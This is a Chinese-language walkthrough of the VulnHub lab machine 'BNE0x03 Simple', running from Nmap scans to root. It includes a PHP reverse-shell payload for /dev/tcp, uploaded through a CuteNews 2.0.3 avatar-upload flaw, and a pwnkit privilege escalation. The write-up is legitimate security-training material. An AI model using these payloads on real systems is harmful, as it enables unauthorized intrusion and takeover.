
## 靶机描述

这是一台标榜难度为简单的开源靶机。作者在描述中说，这是一条非常简单的考验基本 WEB 渗透技巧的 boot2root 机器。我们的目标是获取 root 的 shell。

![des](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261028212832993.png)


## 信息收集

1. 端口扫描

通过使用 TCP 端口扫描，我们发现目标靶机仅开放了一个 80 端口。

```text
# Nmap 7.99 scan initiated Sun Oct 25 18:16:24 2026 as: /usr/lib/nmap/nmap -sT --min-rate 10000 -p- -oA nmapscan/TCPS 192.168.1.13
Nmap scan report for 192.168.1.13
Host is up (0.00066s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:C6:3C:28 (VMware)

# Nmap done at Sun Oct 25 18:16:27 2026 -- 1 IP address (1 host up) scanned in 2.83 seconds
```

2. 详细信息扫描

```
# Nmap 7.99 scan initiated Sun Oct 25 18:19:14 2026 as: /usr/lib/nmap/nmap -sT -sC -O -sV -p80 -oA nmapscan/details 192.168.1.13
Nmap scan report for 192.168.1.13
Host is up (0.00061s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Please Login / CuteNews
MAC Address: 00:0C:29:C6:3C:28 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 25 18:19:22 2026 -- 1 IP address (1 host up) scanned in 8.48 seconds
```

当前的服务器版本是 2.4.7 ，运行一套 CMS 版本 CuteNews 后台管理系统。服务器的版本信息是 3.X 和 4.X,内核版本低，可能存在内核提权的漏洞。

3. 漏洞脚本扫描

漏洞脚本扫描枚举出来了许多信息。为了更加直观的显示，我们通过使用浏览器来探索 WEB 界面存在哪些攻击面。

```text
# Nmap 7.99 scan initiated Sun Oct 25 18:20:05 2026 as: /usr/lib/nmap/nmap --script=vuln -p80 -oA nmapscan/vulns 192.168.1.13
Nmap scan report for 192.168.1.13
Host is up (0.00083s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /rss.php: RSS or Atom feed
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.13
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.1.13:80/
|     Form id: login_form
|     Form action: /index.php
|     
|     Path: http://192.168.1.13:80/?register&lostpass
|     Form id: 
|     Form action: /index.php
|     
|     Path: http://192.168.1.13:80/index.php
|     Form id: login_form
|     Form action: /index.php
|     
|     Path: http://192.168.1.13:80/?register
|     Form id: regpassword
|     Form action: /index.php?register
|     
|     Path: http://192.168.1.13:80/index.php?register
|     Form id: regpassword
|_    Form action: /index.php?register
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:C6:3C:28 (VMware)

# Nmap done at Sun Oct 25 18:25:27 2026 -- 1 IP address (1 host up) scanned in 321.54 seconds

```


## WEB 渗透

通过访问网页，我们发现目标站点是一个运行 CuteNews v.2.0.3 版本的 CMS 网站。我们以 CuteNews v.2.0.3 为关键词，在 searchsploit 工具中搜索，是否有可直接利用的脚本。

![p1](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029200207265.png)


![p2](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029200355504.png)

结果中有一个任意文件上传漏洞引起了我们的兴趣。我们使用 -m 参数将这个 37474.txt 文件的镜像拷贝到本地。

![p3](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029200645276.png)

文件提示我们这是一个远程文件上传的漏洞。
### 文件上次漏洞利用

按照利用的步骤，我先注册了一个 retro 用户，密码是 000000。接着我们访问到以下这个链接

```text
http://192.168.1.13/index.php?mod=main&opt=personal
```

我们可以看到，在用户头像照片上传的地方可能存在任意文件上传漏洞。

![p4](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029201444048.png)

我们编写我们的恶意文件。

```php
<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.4/5566 0>&1"')?>
```

将它命名为 1.php 文件。通过 http 协议返回包显示，我们 1.php 文件已经被移动到这个 /uploads/avatar_retro_1.php 路径下了。

![p5](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029212413907.png)

![p6](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029212516986.png)

![webshell](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029212216101.png)

我们成功获得立足点 WEBSHELL 权限。


这里我经常犯怵，使用这条命令但是这条命令没法返回 shell。

```php
<?php system('/bin/bash -i >&/dev/tcp/192.168.1.4/5566 0>&1');?>
```

那么这两条命令，为啥一条能成功，另一条去执行不成功？使用关键在于这两条命令的执行原理不同，system 函数是通过 "/bin/sh -c <我们的函数输入>"。上面第二条命令执行，会将执行命令解析的 /bin/sh 和这个伪设备套接字绑定，但是 php 中 /bin/sh 其实就是 dash，而为伪设备套接字是 Bash 独有的东西。所以命令执行失败。

我们使用 php 打印当前解析器的名称，就是 dash。

![p7](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261029204405978.png)



## 权限提升

虽然经过权限枚举，我们发现服务器虽然运行这 MySQL 数据库，但是当前网站的 CMS 不需要使用数据库。这个方向是个兔子洞。

![sql](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261030135356600.png)

获得立足点后，我们发现当前操作系统的内核版本比较低，我们采取内核提权的方式进行操作。我们可以选取多种自动化枚举工具，这里我们使用 [les]([GitHub - The-Z-Labs/linux-exploit-suggester: Linux privilege escalation auditing tool · GitHub](https://github.com/The-Z-Labs/linux-exploit-suggester))工具成功找到了可以利用的 内核提权方式，pwnkit 提权。为了测试的广度，我们要选取不同的自动化提权的工具。我尝试了 手段枚举，linpeas 枚举，les 枚举。最终在 les 的结果中，找到了可以利用的方式。

![p8](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261030103113693.png)

这里的 pwnkit 是可以执行的。我们成功获得了 root 权限。

![p9](../vulnhubScreenShot/Vulnhub%20BNE0x03Simple%20靶机渗透总结/IMG-20261030134830840.png)


## 总结

这是一台攻击链路十分清晰的靶机，我们通过信息收集，发现目标只，开发了一个 80 端口。通过公开漏洞利用库，我们很快找到了获取立足点的方式。在权限枚举过程中，我们需要尝试不同的自动化枚举工具，犹如爱迪生发明灯泡那样，尝试各种组合方式。最终获得了权限。

